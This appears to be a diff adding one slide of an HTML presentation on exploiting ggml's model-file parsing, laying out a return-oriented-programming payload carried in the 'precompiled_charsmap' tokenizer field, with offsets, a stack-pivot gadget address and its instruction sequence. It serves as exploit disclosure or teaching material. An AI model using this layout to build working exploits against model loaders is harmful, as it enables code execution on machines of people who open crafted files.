@@ -1,0 +1,17 @@
+<section>
+  <h2 class="section-title">The ROP blob &mdash; <code>precompiled_charsmap</code></h2>
+  <div class="card card-blue full-width">
+    <div class="card-header">UINT8 array — layout consumed during destructor unwinding</div>
+    <pre><code class="language-text">offset   value                  purpose
+──────   ────────────────────   ─────────────────────────────────────────────────
+  0      0                       1st ggml_backend_buffer_free → NULL check returns
+  8      PIVOT (0x236f81c)       2nd free → indirect call lands on the pivot gadget:
+                                   pop rsi ; pop rsp ; pop rbx ; pop r14 ; pop rbp ; ret
+ 16 / 24 junk                    eaten by the gadget's pop r14 / pop rbp
+ 32 ...   ROP chain              the gadget sequence (next slide)
+160 ...   command string         raw NUL-terminated bytes of the final argument</code></pre>
+  </div>
+  <div class="textbox" style="margin-top: 18px;">
+    <p>The blob is carried as a <code>UINT8</code> array so embedded <code>NUL</code> bytes in gadget addresses survive. After the pivot, <code>RSP</code> points into this very blob &mdash; the chain and the command string live <strong>inside the payload</strong>, not somewhere we had to spray to a known address.</p>
+  </div>
+</section>
